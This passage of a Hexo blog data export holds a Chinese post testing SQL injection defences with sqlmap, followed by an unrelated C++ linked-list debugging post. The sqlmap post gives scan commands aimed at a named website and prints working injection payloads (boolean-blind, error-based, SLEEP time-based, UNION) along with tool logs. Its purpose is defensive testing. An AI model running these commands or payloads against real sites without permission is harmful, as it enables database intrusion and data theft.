CONCAT(0x71626a6271,0x457a6c736b4d50776b6b64726471774444456b72447559596f6f684c6b68434b62736d4f7154656b,0x7178787a71),NULL,NULL,NULL-- DBwe\n---\nweb application technology: PHP 5.6.22\nback-end DBMS: MySQL >= 5.5\n```\n\n## 使用`real_escape_string`过滤测试效果\nphp中`real_escape_string`可以过滤防范。\n> /sqlmap.py -u \"http://wufazuce.com/finc/perform/trend?time=1\"  --level=5 --dbms=mysql\n\n```\n[18:01:18] [INFO] testing connection to the target URL\n[18:01:18] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[18:01:18] [INFO] testing if the target URL is stable\n[18:01:19] [INFO] target URL is stable\n[18:01:19] [INFO] testing if GET parameter 'time' is dynamic\n[18:01:19] [INFO] confirming that GET parameter 'time' is dynamic\n[18:01:19] [INFO] GET parameter 'time' is dynamic\n[18:01:19] [WARNING] reflective value(s) found and filtering out\n[18:01:19] [INFO] heuristic (basic) test shows that GET parameter 'time' might be injectable\n[18:01:19] [INFO] testing for SQL injection on GET parameter 'time'\n[18:01:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[18:01:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'\n[18:01:20] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'\n[18:01:20] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'\n[18:01:20] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'\n[18:01:20] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'\n[18:01:21] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'\n[18:01:21] [INFO] testing 'MySQL inline queries'\n[18:01:21] [INFO] testing 'PostgreSQL inline queries'\n[18:01:21] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'\n[18:01:21] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'\n[18:01:21] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'\n[18:01:21] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'\n[18:01:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'\n[18:01:22] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'\n[18:01:22] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'\n[18:01:22] [INFO] testing 'Oracle AND time-based blind'\n[18:01:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'\n[18:01:22] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option '--dbms'\n[18:01:25] [WARNING] GET parameter 'time' does not seem to be injectable\n[18:01:25] [CRITICAL] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. Please, consider usage of tampering scripts as your target might filter the queries. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp'). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment')\n\n```\n\n## 使用php的`addslashes`方法测试效果\n`addslashes`方法前后不会自动加单引号`''`\n\n## 感受\n工具很强大，自己只用了点皮毛，后面有时间再深入研究。\n\n## 参考资料\n- Web安全之SQL注入攻击技巧与防范(http://www.plhwin.com/2014/06/13/web-security-sql/)\n- 是否足够安全http://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string\n","slug":"sqlmap使用心得","published":1,"updated":"2017-01-14T03:00:30.776Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cixyddgqs00060dtqggyslcy3","content":"<h2 id=\"缘由\"><a href=\"#缘由\" class=\"headerlink\" title=\"缘由\"></a>缘由</h2><p>今天想测试下ci框架的sql注入过滤效果，找到了sqlmap来进行接口sql注入效果。不用自己重复造轮子来模拟各种sql注入情况。<br>主要测试内容：</p>\n<ul>\n<li>直接用<code>select * from table where id={$id}</code>看sqlmap工具效果</li>\n<li>使用<code>real_escape_string</code>过滤测试效果</li>\n<li>使用php的<code>addslashes</code>方法测试效果</li>\n</ul>\n<h2 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h2><blockquote>\n<p><a href=\"http://sqlmap.org/\" target=\"_blank\" rel=\"external\">http://sqlmap.org/</a></p>\n</blockquote>\n<hr>\n<p>sqlmp参数说明，直接<code>sqlmap.py -h</code>看介绍。</p>\n<ul>\n<li>–dbms 指定数据库</li>\n<li>–level=LEVEL</li>\n</ul>\n<h2 id=\"模拟有sql注入的情况\"><a href=\"#模拟有sql注入的情况\" class=\"headerlink\" title=\"模拟有sql注入的情况\"></a>模拟有sql注入的情况</h2><p>测试接口：</p>\n<blockquote>\n<p>./sqlmap.py -u “<a href=\"http://wufazuce.com/index.php?time=1\">http://wufazuce.com/index.php?time=1</a>“</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">sqlmap identified the following injection point(s) with a total of 188 HTTP(s) requests:</div><div class=\"line\">---</div><div class=\"line\">Parameter: time (GET)</div><div class=\"line\">    Type: boolean-based blind</div><div class=\"line\">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)</div><div class=\"line\">    Payload: time=1 OR NOT 5138=5138#</div><div class=\"line\"></div><div class=\"line\">    Type: error-based</div><div class=\"line\">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</div><div class=\"line\">    Payload: time=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71626a6271,(SELECT (ELT(3637=3637,1))),0x7178787a71,0x78))s), 8446744073709551610, 8446744073709551610)))</div><div class=\"line\"></div><div class=\"line\">    Type: AND/OR time-based blind</div><div class=\"line\">    Title: MySQL &gt;= 5.0.12 OR time-based blind</div><div class=\"line\">    Payload: time=1 OR SLEEP(5)</div><div class=\"line\"></div><div class=\"line\">    Type: UNION query</div><div class=\"line\">    Title: Generic UNION query (NULL) - 4 columns</div><div class=\"line\">    Payload: time=1 UNION ALL SELECT CONCAT(0x71626a6271,0x457a6c736b4d50776b6b64726471774444456b72447559596f6f684c6b68434b62736d4f7154656b,0x7178787a71),NULL,NULL,NULL-- DBwe</div><div class=\"line\">---</div><div class=\"line\">web application technology: PHP 5.6.22</div><div class=\"line\">back-end DBMS: MySQL &gt;= 5.5</div></pre></td></tr></table></figure>\n<h2 id=\"使用real-escape-string过滤测试效果\"><a href=\"#使用real-escape-string过滤测试效果\" class=\"headerlink\" title=\"使用real_escape_string过滤测试效果\"></a>使用<code>real_escape_string</code>过滤测试效果</h2><p>php中<code>real_escape_string</code>可以过滤防范。</p>\n<blockquote>\n<p>/sqlmap.py -u “<a href=\"http://wufazuce.com/finc/perform/trend?time=1\">http://wufazuce.com/finc/perform/trend?time=1</a>“  –level=5 –dbms=mysql</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div></pre></td><td class=\"code\"><pre><div class=\"line\">[18:01:18] [INFO] testing connection to the target URL</div><div class=\"line\">[18:01:18] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS</div><div class=\"line\">[18:01:18] [INFO] testing if the target URL is stable</div><div class=\"line\">[18:01:19] [INFO] target URL is stable</div><div class=\"line\">[18:01:19] [INFO] testing if GET parameter &apos;time&apos; is dynamic</div><div class=\"line\">[18:01:19] [INFO] confirming that GET parameter &apos;time&apos; is dynamic</div><div class=\"line\">[18:01:19] [INFO] GET parameter &apos;time&apos; is dynamic</div><div class=\"line\">[18:01:19] [WARNING] reflective value(s) found and filtering out</div><div class=\"line\">[18:01:19] [INFO] heuristic (basic) test shows that GET parameter &apos;time&apos; might be injectable</div><div class=\"line\">[18:01:19] [INFO] testing for SQL injection on GET parameter &apos;time&apos;</div><div class=\"line\">[18:01:19] [INFO] testing &apos;AND boolean-based blind - WHERE or HAVING clause&apos;</div><div class=\"line\">[18:01:20] [INFO] testing &apos;MySQL &gt;= 5.0 boolean-based blind - Parameter replace&apos;</div><div class=\"line\">[18:01:20] [INFO] testing &apos;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&apos;</div><div class=\"line\">[18:01:20] [INFO] testing &apos;PostgreSQL AND error-based - WHERE or HAVING clause&apos;</div><div class=\"line\">[18:01:20] [INFO] testing &apos;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&apos;</div><div class=\"line\">[18:01:20] [INFO] testing &apos;Oracle AND error-based - WHERE or HAVING clause (XMLType)&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;MySQL inline queries&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;PostgreSQL inline queries&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;Microsoft SQL Server/Sybase inline queries&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;PostgreSQL &gt; 8.1 stacked queries (comment)&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;Microsoft SQL Server/Sybase stacked queries (comment)&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;MySQL &gt;= 5.0.12 AND time-based blind&apos;</div><div class=\"line\">[18:01:22] [INFO] testing &apos;PostgreSQL &gt; 8.1 AND time-based blind&apos;</div><div class=\"line\">[18:01:22] [INFO] testing &apos;Microsoft SQL Server/Sybase time-based blind (IF)&apos;</div><div class=\"line\">[18:01:22] [INFO] testing &apos;Oracle AND time-based blind&apos;</div><div class=\"line\">[18:01:22] [INFO] testing &apos;Generic UNION query (NULL) - 1 to 10 columns&apos;</div><div class=\"line\">[18:01:22] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option &apos;--dbms&apos;</div><div class=\"line\">[18:01:25] [WARNING] GET parameter &apos;time&apos; does not seem to be injectable</div><div class=\"line\">[18:01:25] [CRITICAL] all tested parameters appear to be not injectable. Try to increase &apos;--level&apos;/&apos;--risk&apos; values to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. Please, consider usage of tampering scripts as your target might filter the queries. Also, you can try to rerun by providing either a valid value for option &apos;--string&apos; (or &apos;--regexp&apos;). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option &apos;--tamper&apos; (e.g. &apos;--tamper=space2comment&apos;)</div></pre></td></tr></table></figure>\n<h2 id=\"使用php的addslashes方法测试效果\"><a href=\"#使用php的addslashes方法测试效果\" class=\"headerlink\" title=\"使用php的addslashes方法测试效果\"></a>使用php的<code>addslashes</code>方法测试效果</h2><p><code>addslashes</code>方法前后不会自动加单引号<code>&#39;&#39;</code></p>\n<h2 id=\"感受\"><a href=\"#感受\" class=\"headerlink\" title=\"感受\"></a>感受</h2><p>工具很强大，自己只用了点皮毛，后面有时间再深入研究。</p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li>Web安全之SQL注入攻击技巧与防范(<a href=\"http://www.plhwin.com/2014/06/13/web-security-sql/\" target=\"_blank\" rel=\"external\">http://www.plhwin.com/2014/06/13/web-security-sql/</a>)</li>\n<li>是否足够安全<a href=\"http://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string\" target=\"_blank\" rel=\"external\">http://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string</a></li>\n</ul>\n","excerpt":"","more":"<h2 id=\"缘由\"><a href=\"#缘由\" class=\"headerlink\" title=\"缘由\"></a>缘由</h2><p>今天想测试下ci框架的sql注入过滤效果，找到了sqlmap来进行接口sql注入效果。不用自己重复造轮子来模拟各种sql注入情况。<br>主要测试内容：</p>\n<ul>\n<li>直接用<code>select * from table where id={$id}</code>看sqlmap工具效果</li>\n<li>使用<code>real_escape_string</code>过滤测试效果</li>\n<li>使用php的<code>addslashes</code>方法测试效果</li>\n</ul>\n<h2 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h2><blockquote>\n<p><a href=\"http://sqlmap.org/\">http://sqlmap.org/</a></p>\n</blockquote>\n<hr>\n<p>sqlmp参数说明，直接<code>sqlmap.py -h</code>看介绍。</p>\n<ul>\n<li>–dbms 指定数据库</li>\n<li>–level=LEVEL</li>\n</ul>\n<h2 id=\"模拟有sql注入的情况\"><a href=\"#模拟有sql注入的情况\" class=\"headerlink\" title=\"模拟有sql注入的情况\"></a>模拟有sql注入的情况</h2><p>测试接口：</p>\n<blockquote>\n<p>./sqlmap.py -u “<a href=\"http://wufazuce.com/index.php?time=1\">http://wufazuce.com/index.php?time=1</a>“</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">sqlmap identified the following injection point(s) with a total of 188 HTTP(s) requests:</div><div class=\"line\">---</div><div class=\"line\">Parameter: time (GET)</div><div class=\"line\">    Type: boolean-based blind</div><div class=\"line\">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)</div><div class=\"line\">    Payload: time=1 OR NOT 5138=5138#</div><div class=\"line\"></div><div class=\"line\">    Type: error-based</div><div class=\"line\">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</div><div class=\"line\">    Payload: time=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71626a6271,(SELECT (ELT(3637=3637,1))),0x7178787a71,0x78))s), 8446744073709551610, 8446744073709551610)))</div><div class=\"line\"></div><div class=\"line\">    Type: AND/OR time-based blind</div><div class=\"line\">    Title: MySQL &gt;= 5.0.12 OR time-based blind</div><div class=\"line\">    Payload: time=1 OR SLEEP(5)</div><div class=\"line\"></div><div class=\"line\">    Type: UNION query</div><div class=\"line\">    Title: Generic UNION query (NULL) - 4 columns</div><div class=\"line\">    Payload: time=1 UNION ALL SELECT CONCAT(0x71626a6271,0x457a6c736b4d50776b6b64726471774444456b72447559596f6f684c6b68434b62736d4f7154656b,0x7178787a71),NULL,NULL,NULL-- DBwe</div><div class=\"line\">---</div><div class=\"line\">web application technology: PHP 5.6.22</div><div class=\"line\">back-end DBMS: MySQL &gt;= 5.5</div></pre></td></tr></table></figure>\n<h2 id=\"使用real-escape-string过滤测试效果\"><a href=\"#使用real-escape-string过滤测试效果\" class=\"headerlink\" title=\"使用real_escape_string过滤测试效果\"></a>使用<code>real_escape_string</code>过滤测试效果</h2><p>php中<code>real_escape_string</code>可以过滤防范。</p>\n<blockquote>\n<p>/sqlmap.py -u “<a href=\"http://wufazuce.com/finc/perform/trend?time=1\">http://wufazuce.com/finc/perform/trend?time=1</a>“  –level=5 –dbms=mysql</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div></pre></td><td class=\"code\"><pre><div class=\"line\">[18:01:18] [INFO] testing connection to the target URL</div><div class=\"line\">[18:01:18] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS</div><div class=\"line\">[18:01:18] [INFO] testing if the target URL is stable</div><div class=\"line\">[18:01:19] [INFO] target URL is stable</div><div class=\"line\">[18:01:19] [INFO] testing if GET parameter &apos;time&apos; is dynamic</div><div class=\"line\">[18:01:19] [INFO] confirming that GET parameter &apos;time&apos; is dynamic</div><div class=\"line\">[18:01:19] [INFO] GET parameter &apos;time&apos; is dynamic</div><div class=\"line\">[18:01:19] [WARNING] reflective value(s) found and filtering out</div><div class=\"line\">[18:01:19] [INFO] heuristic (basic) test shows that GET parameter &apos;time&apos; might be injectable</div><div class=\"line\">[18:01:19] [INFO] testing for SQL injection on GET parameter &apos;time&apos;</div><div class=\"line\">[18:01:19] [INFO] testing &apos;AND boolean-based blind - WHERE or HAVING clause&apos;</div><div class=\"line\">[18:01:20] [INFO] testing &apos;MySQL &gt;= 5.0 boolean-based blind - Parameter replace&apos;</div><div class=\"line\">[18:01:20] [INFO] testing &apos;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&apos;</div><div class=\"line\">[18:01:20] [INFO] testing &apos;PostgreSQL AND error-based - WHERE or HAVING clause&apos;</div><div class=\"line\">[18:01:20] [INFO] testing &apos;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&apos;</div><div class=\"line\">[18:01:20] [INFO] testing &apos;Oracle AND error-based - WHERE or HAVING clause (XMLType)&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;MySQL inline queries&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;PostgreSQL inline queries&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;Microsoft SQL Server/Sybase inline queries&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;PostgreSQL &gt; 8.1 stacked queries (comment)&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;Microsoft SQL Server/Sybase stacked queries (comment)&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&apos;</div><div class=\"line\">[18:01:21] [INFO] testing &apos;MySQL &gt;= 5.0.12 AND time-based blind&apos;</div><div class=\"line\">[18:01:22] [INFO] testing &apos;PostgreSQL &gt; 8.1 AND time-based blind&apos;</div><div class=\"line\">[18:01:22] [INFO] testing &apos;Microsoft SQL Server/Sybase time-based blind (IF)&apos;</div><div class=\"line\">[18:01:22] [INFO] testing &apos;Oracle AND time-based blind&apos;</div><div class=\"line\">[18:01:22] [INFO] testing &apos;Generic UNION query (NULL) - 1 to 10 columns&apos;</div><div class=\"line\">[18:01:22] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option &apos;--dbms&apos;</div><div class=\"line\">[18:01:25] [WARNING] GET parameter &apos;time&apos; does not seem to be injectable</div><div class=\"line\">[18:01:25] [CRITICAL] all tested parameters appear to be not injectable. Try to increase &apos;--level&apos;/&apos;--risk&apos; values to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. Please, consider usage of tampering scripts as your target might filter the queries. Also, you can try to rerun by providing either a valid value for option &apos;--string&apos; (or &apos;--regexp&apos;). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option &apos;--tamper&apos; (e.g. &apos;--tamper=space2comment&apos;)</div></pre></td></tr></table></figure>\n<h2 id=\"使用php的addslashes方法测试效果\"><a href=\"#使用php的addslashes方法测试效果\" class=\"headerlink\" title=\"使用php的addslashes方法测试效果\"></a>使用php的<code>addslashes</code>方法测试效果</h2><p><code>addslashes</code>方法前后不会自动加单引号<code>&#39;&#39;</code></p>\n<h2 id=\"感受\"><a href=\"#感受\" class=\"headerlink\" title=\"感受\"></a>感受</h2><p>工具很强大，自己只用了点皮毛，后面有时间再深入研究。</p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li>Web安全之SQL注入攻击技巧与防范(<a href=\"http://www.plhwin.com/2014/06/13/web-security-sql/\">http://www.plhwin.com/2014/06/13/web-security-sql/</a>)</li>\n<li>是否足够安全<a href=\"http://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string\">http://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string</a></li>\n</ul>\n"},{"title":"遍历链表和插入链表中循环的区别","date":"2017-01-08T04:20:50.000Z","_content":"## 前言\n最近在看《linux内核设计与实现》，里面讲到一些内核数据结构，首先第一个是**链表**。琢磨着自己很久没有写过数据结构，于是复习回顾盲写一个链表，结果这个报错cordump\n\n## 第一个：指针和非指针\n```cpp\n//cmake -DCMAKE_BUILD_TYPE=Debug .. -Dfile=link.cpp\n#include <stdio.h>\n#include <stdlib.h>\n#include <iostream>\nusing namespace std;\n\nstruct list_element{\n\tvoid* data;\n\tstruct list_element* next;\n};\n\nint main(){\n\tcout<<\"hello world!\"<<endl;\n\tchar *str1=\"hello\";\n\tchar *str2=\" world\";\n    /* 测试方法一：非指针，从栈上分配 */\n\tlist_element le;\n\tlist_element le2;\n\tle.data = (void*)str1;\n\tle.next = &le2;\n\tle2.data = (void*)str2;\n\tle2.next = NULL;\n\tprintf(\"le.data=%s\\n\",le.data);\n\tprintf(\"le.next.data=%s\\n\",le.next->data);\n\t\n    /* 测试方法二：指针，未malloc 会导致coredump */\t\n\tlist_element *linke;\n\tlinke->data = (void*)str1;\n\tlinke->next = NULL;\n\tprintf(\"linke.data=%s\\n\",linke->data);\n\t\n\t\n}\n```\n第一种写法，链表对象的内存是直接从栈上分配的，而第二个方法**导致coredump的原因是定义了一个未指向的空指针，**\n```cpp\nlist_element *linke=(list_element *)malloc(sizeof(struct list_element));\n```\n\n\n## 遍历和插入的遍历问题\n```cpp\n//cmake -DCMAKE_BUILD_TYPE=Debug .. -Dfile=link.cpp\n#include <stdio.h>\n#include <stdlib.h>\n#include <iostream>\nusing namespace std;\n\nstruct list_element{\n\tvoid* data;\n\tstruct list_element* next;\n};\n\nint main(){\n\tcout<<\"hello world!\"<<endl;\n\n\tlist_element *link= NULL;\n\tlist_element *head= NULL;\n\t\n\tlist_element *item = (list_element *)malloc(sizeof(struct list_element));\t\n\titem->data = (void*)999;\n\titem->next = NULL;\n\tlink = item;\n\thead = item;\n\tfor(int i=0;i<10;i++){\n\t\tlist_element *item = (list_element *)malloc(sizeof(struct list_element));\t\n\t\titem->data = (void*)i;\n\t\titem->next = NULL;\n\t\t/*  错误写法\t\t*/\n\t\twhile(head){\n\t\t\thead = head->next;\n\t\t}\n\t\thead = item;\n\t\t\n\t\t/* 正确写法\n\t\twhile(head->next){\n\t\t\thead = head->next;\n\t\t}\n\t\thead->next = item;\n\t\t*/\n\t}\n\twhile(link){\n\t\tprintf(\"print %d\\n\",link->data);\n\t\tlink= link->next;\n\t}\n\tcout<<\"end...\"<<endl;\n}\n\n```\n错误写法输出的问题是：总是只输出了第一个元素，百思不得其解，加了各种测试和调试代码，最后才领悟到：**遍历后插入的循环要用while(head->next),和输出打印的while(head)不一样。**  \n为什么呢？  \n原因很简单，插入时当前指针已经为空了，进行赋值操作`head->next = item;`时已经和前面的链表断了联系，正确写法是判断如果`head->next == NULL`，就进行赋值`head->next = item`。\n\n## 反思\n平时底层代码写得少，基本都忘光了，要多加学习。\n\n\n","source":"_posts/遍历链表和插入链表中循环的区别.md","raw":"---\ntitle: 遍历链表和插入链表中循环的区别\ndate: 2017-01-08 12:20:50\ncategories: Linux内核\n---\n## 前言\n最近在看《linux内核设计与实现》，里面讲到一些内核数据结构，首先第一个是**链表**。琢磨着自己很久没有写过数据结构，于是复习回顾盲写一个链表，结果这个报错cordump\n\n## 第一个：指针和非指针\n```cpp\n//cmake -DCMAKE_BUILD_TYPE=Debug .. -Dfile=link.cpp\n#include <stdio.h>\n#include <stdlib.h>\n#include <iostream>\nusing namespace std;\n\nstruct list_element{\n\tvoid* data;\n\tstruct list_element* next;\n};\n\nint main(){\n\tcout<<\"hello world!\"<<endl;\n\tchar *str1=\"hello\";\n\tchar *str2=\" world\";\n    /* 测试方法一：非指针，从栈上分配 */\n\tlist_element le;\n\tlist_element le2;\n\tle.data = (void*)str1;\n\tle.next = &le2;\n\tle2.data = (void*)str2;\n\tle2.next = NULL;\n\tprintf(\"le.data=%s\\n\",le.data);\n\tprintf(\"le.next.data=%s\\n\",le.next->data);\n\t\n    /* 测试方法二：指针，未malloc 会导致coredump */\t\n\tlist_element *linke;\n\tlinke->data = (void*)str1;\n\tlinke->next = NULL;\n\tprintf(\"linke.data=%s\\n\",linke->data);\n\t\n\t\n}\n```\n第一种写法，链表对象的内存是直接从栈上分配的，而第二个方法**导致coredump的原因是定义了一个未指向的空指针，**\n```cpp\nlist_element *linke=(list_element *)malloc(sizeof(struct list_element));\n```\n\n\n## 遍历和插入的遍历问题\n```cpp\n//cmake -DCMAKE_BUILD_TYPE=Debug .. -Dfile=link.cpp\n#include <stdio.h>\n#include <stdlib.h>\n#include <iostream>\nusing namespace std;\n\nstruct list_element{\n\tvoid* data;\n\tstruct list_element* next;\n};\n\nint main(){\n\tcout<<\"hello world!\"<<endl;\n\n\tlist_element *link= NULL;\n\tlist_element *head= NULL;\n\t\n\tlist_element *item = (list_element *)malloc(sizeof(struct list_element));\t\n\titem->data = (void*)999;\n\titem->next = NULL;\n\tlink = item;\n\thead = item;\n\tfor(int i=0;i<10;i++){\n\t\tlist_element *item = (list_element *)malloc(sizeof(struct list_element));\t\n\t\titem->data = (void*)i;\n\t\titem->next = NULL;\n\t\t/*  错误写法\t\t*/\n\t\twhile(head){\n\t\t\thead = head->next;\n\t\t}\n\t\thead = item;\n\t\t\n\t\t/* 正确写法\n\t\twhile(head->next){\n\t\t\thead = head->next;\n\t\t}\n\t\thead->next = item;\n\t\t*/\n\t}\n\twhile(link){\n\t\tprintf(\"print %d\\n\",link->data);\n\t\tlink= link->next;\n\t}\n\tcout<<\"end...\"<<endl;\n}\n\n```\n错误写法输出的问题是：总是只输出了第一个元素，百思不得其解，加了各种测试和调试代码，最后才领悟到：**遍历后插入的循环要用while(head->next),和输出打印的while(head)不一样。**  \n为什么呢？  \n原因很简单，插入时当前指针已经为空了，进行赋值操作`head->next = item;`时已经和前面的链表断了联系，正确写法是判断如果`head->next == NULL`，就进行赋值`head->next = item`。\n\n## 反思\n平时底层代码写得少，基本都忘光了，要多加学习。\n\n\n","slug":"遍历链表和插入链表中循环的区别","published":1,"updated":"2017-01-14T03:03:55.975Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cixyddgr000070dtqqgpxfb0j","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>最近在看《linux内核设计与实现》，里面讲到一些内核数据结构，首先第一个是<strong>链表</strong>。琢磨着自己很久没有写过数据结构，于是复习回顾盲写一个链表，结果这个报错cordump</p>\n<h2 id=\"第一个：指针和非指针\"><a href=\"#第一个：指针和非指针\" class=\"headerlink\" title=\"第一个：指针和非指针\"></a>第一个：指针和非指针</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div 